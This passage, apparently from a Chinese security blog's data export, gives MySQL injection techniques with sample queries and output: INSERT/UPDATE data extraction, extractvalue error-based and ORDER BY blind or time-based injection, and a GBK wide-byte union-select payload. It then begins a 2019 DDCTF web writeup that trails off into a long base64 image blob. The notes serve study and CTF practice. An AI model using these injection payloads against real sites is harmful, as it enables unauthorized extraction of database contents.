如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是0进行运算 mysql&gt; select &#39;&#39;+1; +------+ | &#39;&#39;+1 | +------+ | 1 | +------+ 1 row in set (0.00 sec) 那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可 insert into 情况下： mysql&gt; insert into user(id,name,pass) values(&#39;7&#39;,&#39;chuddy&#39;,&#39;&#39;+conv(hex(substr(database(),1 + (1-1) * 6,6)),16,10)); Query OK, 1 row affected (0.00 sec) mysql&gt; select * from user where id=7; +------+--------+------------+ | id | name | pass | +------+--------+------------+ | 7 | chuddy | 1952805748 | +------+--------+------------+ 1 row in set (0.00 sec) mysql&gt; select unhex(conv(1952805748,10,16)); +-------------------------------+ | unhex(conv(1952805748,10,16)) | +-------------------------------+ | test | +-------------------------------+ 1 row in set (0.00 sec) update 情况下： mysql&gt; update user set pass=&#39;&#39;+conv(hex(substr(user(),1 + (1-1) * 6,6)),16,10) where id=3; Query OK, 1 row affected (0.11 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from user where id =3; +------+-------------+-----------------+ | id | name | pass | +------+-------------+-----------------+ | 3 | ccccccccccc | 125822936825964 | +------+-------------+-----------------+ 1 row in set (0.04 sec) mysql&gt; select unhex(conv(125822936825964,10,16)); +------------------------------------+ | unhex(conv(125822936825964,10,16)) | +------------------------------------+ | root@l | +------------------------------------+ 1 row in set (0.00 sec) order by 注入报错注入常见的利用方式： order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39; 盲注盲注的基本操作\\order by IF((bool),1,(select 1 union select 2)) mysql&gt; select * from user order by if((substr(database(),1,1)&lt;&#39;a&#39;),1,(select 1 union select 2)); ERROR 1242 (21000): Subquery returns more than 1 row mysql&gt; select * from user order by if((substr(database(),1,1)&gt;&#39;a&#39;),1,(select 1 union select 2)); +------+---------------+-----------------------+ | id | name | pass | +------+---------------+-----------------------+ | 1 | aaaaaaaaaa | 123 | | 2 | bbbbbbbbbbbbb | 456 | | 3 | ccccccccccc | 3.2210671827446896e16 | | 4 | dddddddddddd | 258 | | 5 | eeeeeeeee | 159 | | NULL | | NULL | | 6 | cccc | 58 | | 7 | chuddy | 1952805748 | +------+---------------+-----------------------+ 8 rows in set (0.02 sec) 延时注入不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。\\order by IF(1,sleep(3),0); 两条数据就会延时了6秒 宽字节注入原理：在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号&#39;会变为\\&#39;，即%5c%27。构造id=1%df%27%23，在经过转义传递给mysql时，就是id=1%df%5c%27%23，mysql在解析时，会认为%df%5c是一个汉字，而%27就会闭合掉原本sql语句中的（左）单引号，即select xxx from xxx where id=&#39;%df%5c&#39;#&#39;，%23用于注释掉原本sql语句中的（右）单引号。这就是宽字节注入的原理。 注入方式和正常的注入差不多的： %df%27%20union%20select%201,database()--+","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"didictf writeup","slug":"2019didictf部分writeup","date":"2019-04-22T08:18:10.000Z","updated":"2019-06-05T08:53:09.346Z","comments":true,"path":"2019/04/22/2019didictf部分writeup/","link":"","permalink":"http://yoursite.com/2019/04/22/2019didictf部分writeup/","excerpt":"2019DDCTF writeupweb","text":"2019DDCTF writeupweb 滴~打开题目 发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的 &lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;/title&gt;flag.jpg&lt;/br&gt;flag.jpg&lt;/br&gt;&lt;img src=&#39;data:image/gif;base64,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